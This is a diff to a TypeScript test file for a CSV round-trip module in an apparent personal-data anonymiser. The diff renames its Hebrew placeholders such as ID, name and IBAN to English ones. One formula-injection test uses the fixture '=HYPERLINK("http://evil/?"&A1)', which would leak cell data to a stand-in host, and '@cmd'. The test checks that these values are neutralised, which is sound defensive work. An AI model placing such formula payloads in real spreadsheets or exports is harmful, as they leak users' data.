@@ -7,9 +7,9 @@ import type { KeyRow } from "./types";
 import { fromCsv, fromKeyFile, toCsv, toKeyFile } from "./key";
 
 const ROWS: KeyRow[] = [
-  { placeholder: "[ת״ז_1]", original: "123456709", type: "ISRAELI_ID" },
-  { placeholder: "[שם_1]", original: "ישראל ישראלי", type: "PERSON" },
-  { placeholder: "[חשבון_1]", original: "IL620108000000099999999", type: "IL_IBAN" },
+  { placeholder: "[ID_1]", original: "123456709", type: "ISRAELI_ID" },
+  { placeholder: "[NAME_1]", original: "ישראל ישראלי", type: "PERSON" },
+  { placeholder: "[IBAN_1]", original: "IL620108000000099999999", type: "IL_IBAN" },
 ];
 
 describe("CSV round-trip", () => {
@@ -19,8 +19,8 @@ describe("CSV round-trip", () => {
 
   it("survives values containing commas, quotes and newlines", () => {
     const tricky: KeyRow[] = [
-      { placeholder: "[שם_1]", original: 'כהן, ישראל "עו״ד"', type: "PERSON" },
-      { placeholder: "[מקום_1]", original: "רחוב הרצל 1\nתל אביב", type: "LOCATION" },
+      { placeholder: "[NAME_1]", original: 'כהן, ישראל "עו״ד"', type: "PERSON" },
+      { placeholder: "[LOC_1]", original: "רחוב הרצל 1\nתל אביב", type: "LOCATION" },
     ];
     expect(fromCsv(toCsv(tricky))).toEqual(tricky);
   });
@@ -32,9 +32,9 @@ describe("CSV round-trip", () => {
 
   it("neutralizes spreadsheet formula injection but round-trips losslessly", () => {
     const dangerous: KeyRow[] = [
-      { placeholder: "[טלפון_1]", original: "+972-52-1234567", type: "IL_PHONE" },
-      { placeholder: "[שם_1]", original: '=HYPERLINK("http://evil/?"&A1)', type: "PERSON" },
-      { placeholder: "[שם_2]", original: "@cmd", type: "PERSON" },
+      { placeholder: "[PHONE_1]", original: "+972-52-1234567", type: "IL_PHONE" },
+      { placeholder: "[NAME_1]", original: '=HYPERLINK("http://evil/?"&A1)', type: "PERSON" },
+      { placeholder: "[NAME_2]", original: "@cmd", type: "PERSON" },
     ];
     const csv = toCsv(dangerous);
     // Every risky value is prefixed with a single quote so Excel/Sheets treats it as text.
